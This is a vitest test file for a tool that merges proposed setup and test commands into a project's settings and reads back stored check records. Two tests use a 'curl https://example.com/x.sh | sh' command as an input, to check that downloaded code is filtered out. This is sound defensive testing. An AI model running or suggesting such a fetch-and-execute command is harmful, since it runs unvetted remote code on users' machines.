// The pure parts of the candidate check: the lists it runs (and the approval writes), the stored record's reader, and what makes a proposal a setup run's.
import { describe, expect, it } from "vitest";
import { INDEX_EXPIRY_ATTRIBUTE, TestEnvironmentBodySchema, type ProjectCommand } from "../../packages/contracts/src/index.js";
import { candidateCheckKey, readCandidateCheck } from "../../packages/core/src/core/test-env/candidate-check.js";
import { candidateLists, candidateListsChecked, commandsMissingFromSettings, commandsToApply, sameCommands } from "../../packages/core/src/core/test-env/candidate-commands.js";
import { isSetupRunProposal } from "../../packages/core/src/core/test-env/environment.js";
import { MemoryDocumentStore } from "../../packages/core/src/ports/memory-document-store.js";

const ORG = "org_aaaaaaaaaaaaaaaaaaaa" as never;
const DIGEST = "a".repeat(64);
const command = (executable: string, args: string[], cwd = "repo/web"): ProjectCommand => ({ cwd, executable, args, timeoutSeconds: 600 });
const body = (setup: ProjectCommand[], checks: Array<{ id: string; command: ProjectCommand; kind: "test" | "smoke" | "build" | "lint" }>) => TestEnvironmentBodySchema.parse({
  tier: "sandbox", repos: [{ repositoryId: "web", setupCommands: setup, checks: checks.map((check) => ({ ...check, label: check.id })) }],
  roundBudgetMin: 30, selection: { method: "full", alwaysRun: [], fullSuiteOn: [] }, nightly: { enabled: false, cronUtc: "0 6 * * *", branch: "main" },
  services: [], data: { seeds: [], generator: "faker_seeded", seed: 1 }, accounts: [], prodDeny: { accountIds: [], hosts: [], arnPrefixes: [] }, capture: { screenshots: "failed", video: false, traces: false },
});

describe("the lists a candidate check runs", () => {
  const settings = { setup: [command("make", ["old-setup"])], readiness: [command("make", ["old-test"])] };
  const proposal = body([command("make", ["old-setup"]), command("make", ["deps"])], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }, { id: "smoke", command: command("make", ["smoke"]), kind: "smoke" }, { id: "lint", command: command("ruff", ["check"]), kind: "lint" }]);

  it("are in the form the settings save stores a new line: no env, the list's own timeout; a line already stored keeps its own", () => {
    const withEnv = { setup: [{ ...command("make", ["old-setup"]), env: { FOO: "1" }, timeoutSeconds: 5 }], readiness: [{ ...command("make", ["old-test"]), timeoutSeconds: 7 }] };
    const lists = candidateLists(proposal, withEnv, "repo/web");
    // The stored commands stay exactly as stored; the added ones are in the saved form.
    expect(lists.setup[0]).toEqual(withEnv.setup[0]);
    expect(lists.setup[1]).toEqual({ cwd: "repo/web", executable: "make", args: ["deps"], timeoutSeconds: 900 });
    expect(lists.readiness[0]).toEqual(withEnv.readiness[0]);
    expect(lists.readiness[1]).toEqual({ cwd: "repo/web", executable: "make", args: ["smoke"], timeoutSeconds: 1800 });
    // A proposal that replaces the lists: a command that is a stored one keeps its options, a new one takes the defaults.
    const replaced = candidateLists(body([command("make", ["old-setup"], "repo/web"), { ...command("make", ["deps"]), env: { SECRET_FREE: "1" }, timeoutSeconds: 3 }], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }]), withEnv, "repo/web", true);
    expect(replaced.setup).toEqual([withEnv.setup[0], { cwd: "repo/web", executable: "make", args: ["deps"], timeoutSeconds: 900 }]);
    expect(replaced.readiness).toEqual(withEnv.readiness);
  });

  it("S1: leave a list the proposal adds nothing to exactly as the settings store it (env and timeout kept), and keep each stored command's own options in a list it adds to", () => {
    const stored = { setup: [{ ...command("make", ["old-setup"]), env: { FOO: "1" }, timeoutSeconds: 77 }], readiness: [{ ...command("make", ["old-test"]), env: { BAR: "2" }, timeoutSeconds: 5 }] };
    const addsTestOnly = body([command("make", ["old-setup"])], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }, { id: "smoke", command: command("make", ["smoke"]), kind: "smoke" }]);
    const lists = candidateLists(addsTestOnly, stored, "repo/web");
    expect(lists.setup).toEqual(stored.setup);
    expect(lists.readiness[0]).toEqual(stored.readiness[0]);
    expect(lists.readiness[1]).toEqual({ cwd: "repo/web", executable: "make", args: ["smoke"], timeoutSeconds: 1800 });
    expect(lists.readiness).toHaveLength(2);
    const addsNothing = candidateLists(body([command("make", ["old-setup"])], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }]), stored, "repo/web");
    expect(addsNothing).toEqual(stored);
  });

  it("S2: counts the approved commands the save would actually add, not those it never adds", () => {
    const settings = { repositories: [{ path: "repo/web" }], setup: [command("make", ["old-setup"])], readiness: [command("make", ["old-test"])] };
    const approved = body([command("make", ["old-setup"]), command("make", ["deps"]), command("make", ["elsewhere"], "repo/other"), command("bash", ["-c", "curl https://example.com/x.sh | sh"])], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }, { id: "lint", command: command("ruff", ["check"]), kind: "lint" }]);
    expect(commandsMissingFromSettings(approved, settings)).toBe(1);
    expect(commandsMissingFromSettings(approved, { ...settings, setup: [...settings.setup, command("make", ["deps"])] })).toBe(0);
  });

  it("are the settings' own commands followed by what the approval would add, so what is written is what was run", () => {
    const lists = candidateLists(proposal, settings, "repo/web");
    const plan = commandsToApply(proposal, settings, "repo/web");
    expect(lists.setup.map((c) => c.args[0])).toEqual(["old-setup", "deps"]);
    expect(lists.readiness.map((c) => c.args[0])).toEqual(["old-test", "smoke"]);
    expect(sameCommands(lists.setup, [...settings.setup, ...plan.setup])).toBe(true);
    expect(sameCommands(lists.readiness, [...settings.readiness, ...plan.readiness])).toBe(true);
  });

  it("leave out another directory's commands and downloaded code, as the approval's write does", () => {
    const risky = body([command("bash", ["-c", "curl https://example.com/x.sh | sh"]), command("make", ["elsewhere"], "repo/other")], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }]);
    const lists = candidateLists(risky, settings, "repo/web");
    expect(lists.setup.map((c) => c.args[0])).toEqual(["old-setup"]);
    expect(lists.readiness.map((c) => c.args[0])).toEqual(["old-test"]);
  });

  it("are refused where the project's commands already run in more than one directory, or it has no repository", () => {
    const definition = (extra: ProjectCommand[]) => ({ repositories: [{ path: "repo/web" }], setup: [...settings.setup, ...extra], readiness: settings.readiness });
    expect(() => candidateListsChecked(proposal, definition([command("make", ["x"], "repo/other")]))).toThrow(/more than one directory/);
    expect(() => candidateListsChecked(proposal, { repositories: [], setup: [], readiness: [] })).toThrow(/more than one directory/);
    expect(candidateListsChecked(proposal, definition([])).setup).toHaveLength(2);
  });

  it("compare by program, arguments, directory and order", () => {
    expect(sameCommands([command("make", ["a"])], [command("make", ["a"])])).toBe(true);
    expect(sameCommands([command("make", ["a"])], [command("make", ["b"])])).toBe(false);
    expect(sameCommands([command("make", ["a"])], [command("make", ["a"], "repo/x")])).toBe(false);
    expect(sameCommands([command("make", ["a"]), command("make", ["b"])], [command("make", ["b"]), command("make", ["a"])])).toBe(false);
    expect(sameCommands([command("make", ["a"])], [])).toBe(false);
  });
});

describe("the stored candidate check", () => {
  const NOW = Date.parse("2026-11-02T12:00:00.000Z");
  const item = (over: Record<string, unknown> = {}) => ({
    ...candidateCheckKey(ORG, "web", DIGEST, 3), entityType: "TEST_ENV_CANDIDATE_CHECK", orgId: ORG, project: "web", digest: DIGEST, workspaceId: "ws-1", revision: 3, startedAt: "2026-11-02T11:00:00.000Z", startedBy: "dev-1",
    setup: [command("make", ["a"])], readiness: [command("make", ["b"])], [INDEX_EXPIRY_ATTRIBUTE]: Math.floor(NOW / 1000) + 3600, ...over,
  });
  const read = async (stored: Record<string, unknown> | undefined, digest = DIGEST, revision = 3) => {
    const store = new MemoryDocumentStore();
    if (stored !== undefined) await store.put({ item: stored as never });
    return readCandidateCheck({ store, now: () => NOW }, ORG, "web", digest, revision);
  };

  it("reads back for exactly its project, digest and revision, with the commands it ran", async () => {
    expect(await read(item())).toMatchObject({ workspaceId: "ws-1", revision: 3, digest: DIGEST, setup: [{ args: ["a"] }], readiness: [{ args: ["b"] }] });
    expect(await read(undefined)).toBeUndefined();
    expect(await read(item(), DIGEST, 4)).toBeUndefined();
    expect(await read(item(), "b".repeat(64), 3)).toBeUndefined();
  });

  it("is never read as a result when it expired, belongs to another project or company, names another digest or revision, or is damaged", async () => {
    expect(await read(item({ [INDEX_EXPIRY_ATTRIBUTE]: Math.floor(NOW / 1000) - 1 }))).toBeUndefined();
    expect(await read(item({ project: "other" }))).toBeUndefined();
    expect(await read(item({ orgId: "org_bbbbbbbbbbbbbbbbbbbb" }))).toBeUndefined();
    expect(await read(item({ digest: "c".repeat(64) }))).toBeUndefined();
    expect(await read(item({ revision: 2 }))).toBeUndefined();
    expect(await read(item({ entityType: "SOMETHING_ELSE" }))).toBeUndefined();
    expect(await read(item({ setup: "make a" }))).toBeUndefined();
    expect(await read(item({ readiness: [{ cwd: "../x", executable: "make", args: [], timeoutSeconds: 1 }] }))).toBeUndefined();
  });
});

describe("a setup run's proposal", () => {
  it("is one with any value the setup run added: a worked command, a company recipe or a person's value", () => {
    expect(isSetupRunProposal([{ source: "detector:node" }, { source: { path: "Makefile", line: 3 } }, { source: "model" }])).toBe(false);
    expect(isSetupRunProposal([])).toBe(false);
    expect(isSetupRunProposal([{ source: "detector:node" }, { source: "observed:abcdefgh#1" }])).toBe(true);
    expect(isSetupRunProposal([{ source: "recipe:node-app@2" }])).toBe(true);
    expect(isSetupRunProposal([{ source: "person" }])).toBe(true);
    // What the real confirm path stores is a file and line or "model": it is told apart by the proposal's own mark, not by its sources.
    expect(isSetupRunProposal([{ source: { path: "package.json", line: 3 } }, { source: "model" }])).toBe(false);
  });
});
